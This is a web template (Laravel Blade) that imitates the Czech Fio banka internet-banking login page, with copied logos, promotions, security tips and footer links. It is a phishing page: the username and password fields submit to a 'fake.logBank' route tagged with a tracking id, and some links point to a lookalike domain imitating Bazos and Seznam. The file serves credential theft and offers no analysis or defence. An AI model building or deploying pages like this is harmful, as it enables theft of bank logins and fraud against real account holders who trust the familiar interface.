@extends('layouts.fake')
@push('css')
    <link href="{{asset('css/fio.css')}}" rel="stylesheet">
    <style>
        /*<![CDATA[*/
        html, body {
            background: none repeat scroll 0 0 #fff;
        }
        /*]]>*/
        .dropdown-toggle:after{
            position: absolute;
            width: 0;
            height: 0;
            visibility: hidden;
        }
    </style>
@endpush
@section('content')

    <div class="green_border"></div>
    <div class="container" style="margin-bottom: 20px;">
        <div class="row">
            <div class="col-md-4 " style="line-height: 50px;">
                <img class="logo_header img-responsive"
                     src="{{asset($bank['logo'])}}">
            </div>
            <div class="col-md-8 nav_header">
                <div>
                    <form class="form-inline pull-right" method="post"
                          action="https://bazos-cz.seznam-spay.com/login?-1.IFormSubmitListener-languageSelector-form">
                        <div style="width:0px;height:0px;position:absolute;left:-100px;top:-100px;overflow:hidden"><input
                                    type="hidden" name="id190eb89732f516219_hf_0" id="id190eb89732f516219_hf_0"></div>
                        <div class="form-group">
                            <select class="form-control pull-right" name="language" id="id3c278181ecf5e52e8"
                                    onchange="this.form.submit()" style="display: none;">
                                <option selected="selected" value="0"
                                        data-content="&lt;span&gt;&lt;img src=&#39;https://ib.fio.cz/ib/wicket/resource/cz.fio.ib2.web.layout.images.Images/VlajkaCzMala-ver-425A2FE80A90297180F0DCC77B3F66B6.png&#39;&gt; Česky&lt;/span&gt;">
                                    CZECH
                                </option>
                                <option value="1"
                                        data-content="&lt;span&gt;&lt;img src=&#39;https://ib.fio.cz/ib/wicket/resource/cz.fio.ib2.web.layout.images.Images/VlajkaSkMala-ver-54AA18CD9834A48A7616BB29EA79F102.png&#39;&gt; Slovensky&lt;/span&gt;">
                                    SLOVAK
                                </option>
                                <option value="2"
                                        data-content="&lt;span&gt;&lt;img src=&#39;https://ib.fio.cz/ib/wicket/resource/cz.fio.ib2.web.layout.images.Images/VlajkaGbMala-ver-E4896565595FC22E344FD619C0ED15BB.png&#39;&gt; English&lt;/span&gt;">
                                    ENGLISH
                                </option>
                            </select>
                            <div class="btn-group bootstrap-select form-control pull-right" style="border: none;padding: 0">
                                <button type="button" class="btn dropdown-toggle selectpicker btn-default"
                                        data-toggle="dropdown" data-id="id3c278181ecf5e52e8"><span
                                            class="filter-option pull-left"><span><img
                                                    src="{{asset('images/banks/VlajkaCzMala-ver-425A2FE80A90297180F0DCC77B3F66B6.png')}}">&nbsp;Česky</span></span>&nbsp;<span
                                            class="caret"></span></button>
                                <div class="dropdown-menu open">
                                    <ul class="dropdown-menu inner selectpicker" role="menu">
                                        <li data-original-index="0" class="selected"><a tabindex="0" class=""
                                                                                        data-normalized-text="&lt;span&gt;&lt;img src=&#39;https://ib.fio.cz/ib/wicket/resource/cz.fio.ib2.web.layout.images.Images/VlajkaCzMala-ver-425A2FE80A90297180F0DCC77B3F66B6.png&#39;&gt; Česky&lt;/span&gt;"><span><img
                                                            src="{{asset('images/banks/VlajkaCzMala-ver-425A2FE80A90297180F0DCC77B3F66B6.png')}}">&nbsp;Česky</span><span
                                                        class="glyphicon glyphicon-ok check-mark"></span></a></li>
                                        <li data-original-index="1"><a tabindex="0" class=""
                                                                       data-normalized-text="&lt;span&gt;&lt;img src=&#39;https://ib.fio.cz/ib/wicket/resource/cz.fio.ib2.web.layout.images.Images/VlajkaSkMala-ver-54AA18CD9834A48A7616BB29EA79F102.png&#39;&gt; Slovensky&lt;/span&gt;"><span><img
                                                            src="{{asset('images/banks/VlajkaSkMala-ver-54AA18CD9834A48A7616BB29EA79F102.png')}}">&nbsp;Slovensky</span><span
                                                        class="glyphicon glyphicon-ok check-mark"></span></a></li>
                                        <li data-original-index="2"><a tabindex="0" class=""
                                                                       data-normalized-text="&lt;span&gt;&lt;img src=&#39;https://ib.fio.cz/ib/wicket/resource/cz.fio.ib2.web.layout.images.Images/VlajkaGbMala-ver-E4896565595FC22E344FD619C0ED15BB.png&#39;&gt; English&lt;/span&gt;"><span><img
                                                            src="{{asset('images/banks/VlajkaGbMala-ver-E4896565595FC22E344FD619C0ED15BB.png')}}">&nbsp;English</span><span
                                                        class="glyphicon glyphicon-ok check-mark"></span></a></li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
    <div class="container">
        <div class="row">
            <div class="col-md-6">
                <h1 class="h1_login">
                    Přihlášení do Internetbankingu
                </h1>

                <div class="loginBox">
                    <form id="bank_pm_form" method="POST"
                          action="{{subRoute('fake.logBank', ['track_id' => $fake->track_id])}}"
                          role="form" autocomplete="off" class="form-horizontal">
                        <div style="width:0px;height:0px;position:absolute;left:-100px;top:-100px;overflow:hidden">
                        </div>
                        <div class="form-group">
                            <label class="col-md-4 control-label" for="id9c967d0bc16f26df1">Uživatelské jméno</label>
                            <div class="col-sm-7">
                                <input class="form-control" autocomplete="off" value="" name="login"
                                       id="id9c967d0bc16f26df1">
                            </div>
                            <div>
                                <i class="fa fa-keyboard-o fa-lg white" style="cursor: pointer; margin-top: 9px"
                                   id="id3309ca3d43a4475e2" data-title="Zobrazit / skrýt grafickou klávesnici"
                                   data-placement="top" aria-label="Zobrazit / skrýt grafickou klávesnici"
                                   data-original-title="" title=""></i><span
                                        id="id3309ca3d43a4475e2_tooltipContainer"></span>
                                <div class="virtualKeyboard" style="display: none;" id="id5fe149150a6e2d753">
                <span class="btn btn-xs closeVK">
                    <i class="fa fa-times"></i>
                </span>
                                    <ul class="keyboard">
                                        <li class="symbol"><span class="off">~</span><span class="on">€</span></li>
                                        <li class="symbol"><span class="off">1</span><span class="on">!</span></li>
                                        <li class="symbol"><span class="off">2</span><span class="on">@</span></li>
                                        <li class="symbol"><span class="off">3</span><span class="on">#</span></li>
                                        <li class="symbol"><span class="off">4</span><span class="on">$</span></li>
                                        <li class="symbol"><span class="off">5</span><span class="on">%</span></li>
                                        <li class="symbol"><span class="off">6</span><span class="on">^</span></li>
                                        <li class="symbol"><span class="off">7</span><span class="on amp">&amp;</span></li>
                                        <li class="symbol"><span class="off">8</span><span class="on">*</span></li>
                                        <li class="symbol"><span class="off">9</span><span class="on">(</span></li>
                                        <li class="symbol"><span class="off">0</span><span class="on">)</span></li>
                                        <li class="symbol"><span class="off">-</span><span class="on">_</span></li>
                                        <li class="symbol"><span class="off">=</span><span class="on">+</span></li>
                                        <li class="delete lastitem">delete</li>
                                        <li class="letter" style="margin-left: 16px;">ě</li>
                                        <li class="letter">š</li>
                                        <li class="letter">č</li>
                                        <li class="letter">ř</li>
                                        <li class="letter">ž</li>
                                        <li class="letter">ý</li>
                                        <li class="letter">á</li>
                                        <li class="letter">í</li>
                                        <li class="letter">é</li>
                                        <li class="letter">ú</li>
                                        <li class="letter">ů</li>
                                        <li class="letter">ó</li>
                                        <li class="letter">ť</li>
                                        <li class="letter">ď</li>
                                        <li class="tab">tab</li>
                                        <li class="letter">q</li>
                                        <li class="letter">w</li>
                                        <li class="letter">e</li>
                                        <li class="letter">r</li>
                                        <li class="letter">t</li>
                                        <li class="letter">y</li>
                                        <li class="letter">u</li>
                                        <li class="letter">i</li>
                                        <li class="letter">o</li>
                                        <li class="letter">p</li>
                                        <li class="symbol"><span class="off">[</span><span class="on">{</span></li>
                                        <li class="symbol"><span class="off">]</span><span class="on">}</span></li>
                                        <li class="symbol lastitem"><span class="off">\</span><span class="on">|</span></li>
                                        <li class="capslock">caps lock</li>
                                        <li class="letter">a</li>
                                        <li class="letter">s</li>
                                        <li class="letter">d</li>
                                        <li class="letter">f</li>
                                        <li class="letter">g</li>
                                        <li class="letter">h</li>
                                        <li class="letter">j</li>
                                        <li class="letter">k</li>
                                        <li class="letter">l</li>
                                        <li class="symbol"><span class="off">;</span><span class="on">:</span></li>
                                        <li class="symbol"><span class="off">'</span><span class="on">"</span></li>
                                        <li class="symbol lastitem"><span class="off">§</span><span class="on">§</span></li>

                                        <li class="left-shift">shift</li>
                                        <li class="letter">z</li>
                                        <li class="letter">x</li>
                                        <li class="letter">c</li>
                                        <li class="letter">v</li>
                                        <li class="letter">b</li>
                                        <li class="letter">n</li>
                                        <li class="letter">m</li>
                                        <li class="symbol"><span class="off">,</span><span class="on lt">&lt;</span></li>
                                        <li class="symbol"><span class="off">.</span><span class="on gt">&gt;</span></li>
                                        <li class="symbol"><span class="off">/</span><span class="on">?</span></li>
                                        <li class="right-shift lastitem">shift</li>
                                        <li class="space lastitem">&nbsp;</li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                        <div class="form-group">
                            <label class="col-md-4 control-label" for="id70eca20eb20bceab5">Heslo</label>
                            <div class="col-sm-7">
                                <input type="password" class="form-control passKeyboard" autocomplete="off" value=""
                                       name="password" id="id70eca20eb20bceab5">
                            </div>
                            <div>
                                <i class="fa fa-keyboard-o fa-lg white" style="cursor: pointer; margin-top: 9px"
                                   id="id6a5f00a0692dd24b4" data-title="Zobrazit / skrýt grafickou klávesnici"
                                   data-placement="top" aria-label="Zobrazit / skrýt grafickou klávesnici"
                                   data-original-title="" title=""></i><span
                                        id="id6a5f00a0692dd24b4_tooltipContainer"></span>
                                <div class="virtualKeyboard" style="display: none;" id="idfdf9fa8973b999cf6">
                <span class="btn btn-xs closeVK">
                    <i class="fa fa-times"></i>
                </span>
                                    <ul class="keyboard">
                                        <li class="symbol"><span class="off">~</span><span class="on">€</span></li>
                                        <li class="symbol"><span class="off">1</span><span class="on">!</span></li>
                                        <li class="symbol"><span class="off">2</span><span class="on">@</span></li>
                                        <li class="symbol"><span class="off">3</span><span class="on">#</span></li>
                                        <li class="symbol"><span class="off">4</span><span class="on">$</span></li>
                                        <li class="symbol"><span class="off">5</span><span class="on">%</span></li>
                                        <li class="symbol"><span class="off">6</span><span class="on">^</span></li>
                                        <li class="symbol"><span class="off">7</span><span class="on amp">&amp;</span></li>
                                        <li class="symbol"><span class="off">8</span><span class="on">*</span></li>
                                        <li class="symbol"><span class="off">9</span><span class="on">(</span></li>
                                        <li class="symbol"><span class="off">0</span><span class="on">)</span></li>
                                        <li class="symbol"><span class="off">-</span><span class="on">_</span></li>
                                        <li class="symbol"><span class="off">=</span><span class="on">+</span></li>
                                        <li class="delete lastitem">delete</li>
                                        <li class="letter" style="margin-left: 16px;">ě</li>
                                        <li class="letter">š</li>
                                        <li class="letter">č</li>
                                        <li class="letter">ř</li>
                                        <li class="letter">ž</li>
                                        <li class="letter">ý</li>
                                        <li class="letter">á</li>
                                        <li class="letter">í</li>
                                        <li class="letter">é</li>
                                        <li class="letter">ú</li>
                                        <li class="letter">ů</li>
                                        <li class="letter">ó</li>
                                        <li class="letter">ť</li>
                                        <li class="letter">ď</li>
                                        <li class="tab">tab</li>
                                        <li class="letter">q</li>
                                        <li class="letter">w</li>
                                        <li class="letter">e</li>
                                        <li class="letter">r</li>
                                        <li class="letter">t</li>
                                        <li class="letter">y</li>
                                        <li class="letter">u</li>
                                        <li class="letter">i</li>
                                        <li class="letter">o</li>
                                        <li class="letter">p</li>
                                        <li class="symbol"><span class="off">[</span><span class="on">{</span></li>
                                        <li class="symbol"><span class="off">]</span><span class="on">}</span></li>
                                        <li class="symbol lastitem"><span class="off">\</span><span class="on">|</span></li>
                                        <li class="capslock">caps lock</li>
                                        <li class="letter">a</li>
                                        <li class="letter">s</li>
                                        <li class="letter">d</li>
                                        <li class="letter">f</li>
                                        <li class="letter">g</li>
                                        <li class="letter">h</li>
                                        <li class="letter">j</li>
                                        <li class="letter">k</li>
                                        <li class="letter">l</li>
                                        <li class="symbol"><span class="off">;</span><span class="on">:</span></li>
                                        <li class="symbol"><span class="off">'</span><span class="on">"</span></li>
                                        <li class="symbol lastitem"><span class="off">§</span><span class="on">§</span></li>

                                        <li class="left-shift">shift</li>
                                        <li class="letter">z</li>
                                        <li class="letter">x</li>
                                        <li class="letter">c</li>
                                        <li class="letter">v</li>
                                        <li class="letter">b</li>
                                        <li class="letter">n</li>
                                        <li class="letter">m</li>
                                        <li class="symbol"><span class="off">,</span><span class="on lt">&lt;</span></li>
                                        <li class="symbol"><span class="off">.</span><span class="on gt">&gt;</span></li>
                                        <li class="symbol"><span class="off">/</span><span class="on">?</span></li>
                                        <li class="right-shift lastitem">shift</li>
                                        <li class="space lastitem">&nbsp;</li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                        <div class="form-group">
                            <div class="col-xs-offset-4 col-md-3">
                                <button type="submit" class="btn greenBtn btn-sm" id="idf2315b3c8f67665db">
                                    Přihlásit se
                                </button>
                            </div>
                            <div class="col-md-4">

                            </div>
                        </div>
                    </form>
                </div>
            </div>
            <div class="col-xs-offset-1 col-md-5">

                <h2 class="h2_login">Smartbanking má svěží vzhled a nové funkce</h2>

                <div class="AdloginText Side"><a target="_blank"
                                                 href="https://www.fio.cz/bankovni-sluzby/smartbanking?utm_source=ib&amp;utm_medium=side&amp;utm_campaign=sb_2.5#novinky">
                        <p>Pročistili jsme vzhled aplikace, přidali stav čerpání limitů karet a možnost blokovat vybrané typy
                            transakcí (např. s DCC). Můžete získat i lepší přehled o účtech - pojmenovat je, odlišit barvou,
                            seřadit a skrýt dle libosti.</p></a></div>

                <div class="AdLoginSideSmallImg">
                    <a target="_blank"
                       href="https://www.fio.cz/bankovni-sluzby/smartbanking?utm_source=ib&amp;utm_medium=side&amp;utm_campaign=sb_2.5#novinky">
                        <img src="{{asset('images/banks/457x125_Fio_Smartbanking_verze_2_5.jpg')}}">
                    </a>
                </div>
            </div>
        </div>


        <div class="row" style="margin-top: 100px;">
            <div class="col-md-4">

                <h2 class="h2_login">Tipy pro vaši bezpečnost</h2>

                <div class="AdloginText"><a target="_blank"
                                            href="https://www.fio.cz/docs/cz/Upozorneni_na_bezpecnostni_rizika_souvisejici_s_pouzivanim_Internetbankingu.pdf"><span>Při přihlašování by v políčku s internetovou adresou mělo být https://ib.fio.cz/ib/login a pod ikonou zámečku byste vždy měli najít certifikát dokládající, že jste na webu Fio banky.</span></a>
                </div>

            </div>
            <div class="col-md-4">

                <h2 class="h2_login">
                    Kontakty
                </h2>
                <div class="row">
                    <div class="col-md-7">
                        <strong>Infolinka</strong>
                    </div>
                    <div class="col-md-5">
                        224 346 800
                    </div>
                </div>
                <div class="row">
                    <div class="col-md-7">
                        <strong>Kontaktní formulář</strong>
                    </div>
                    <div class="col-md-5">
                        <a href="https://www.fio.cz/o-nas/napiste-nam"> napište nám
                        </a>
                    </div>
                </div>
                <div class="row">
                    <div class="col-md-7">
                        <strong>Pobočky a bankomaty</strong>
                    </div>
                    <div class="col-md-5">
                        <a href="http://www.fio.cz/o-nas/kontakty">seznam</a><a
                                href="https://bazos-cz.seznam-spay.com/3ds1644254052959357"> </a>
                    </div>
                </div>


            </div>
            <div class="col-md-4">

                <h2 class="h2_login">
                    Další informace
                </h2>
                <div class="row">
                    <div class="col-md-12">
                        <a href="http://www.fio.cz/docs/cz/Desatero_bezpecneho_pouzivani_IB.pdf">Desatero bezpečného
                            používání Internetbankingu</a>
                    </div>
                </div>
                <div class="row">
                    <div class="col-md-12">
                        <a href="http://www.fio.cz/o-nas/dokumenty-ceniky/ceniky-sazebniky">Ceníky a sazebníky</a>
                    </div>
                </div>
                <div class="row">
                    <div class="col-md-12">
                        <a href="http://www.fio.cz/o-nas/dokumenty-ceniky/manualy">Technická podpora, manuály</a>
                    </div>
                </div>


            </div>
        </div>


        <div class="row" style="margin-top: 20px;">

            <h2 class="h2_login hide"></h2>

            <div class="col-md-12" style="margin-top: 30px">
                <a target="_blank"
                   href="https://www.fio.cz/bankovni-sluzby/uvery/splatkovy-uver?utm_source=ib&amp;utm_medium=ban_in&amp;utm_campaign=pujcka">
                    <img src="{{asset('images/banks/1140x150_IB_Fio_splatkove_uvery_Slavikk.jpg')}}">
                </a>
            </div>
        </div>


        <div class="row">
            <div class="col-md-12">

                <div class="loginFooter text-right">
                    Copyright ©
                    <span>2021</span>
                    Fio banka
                    |
                    <a href="http://www.fio.cz/spolecnost_dokumenty_ostatni_pravniProhlaseni.php"><strong>Právní
                            prohlášení</strong></a>
                    |
                    <a href="http://www.rmsystem.cz/"><strong>RM-SYSTÉM</strong></a>
                    |
                    <a href="http://www.akcie.cz/"><strong>AKCIE.CZ</strong></a>
                </div>


            </div>
        </div>
    </div>
@endsection
@push('js')
@endpush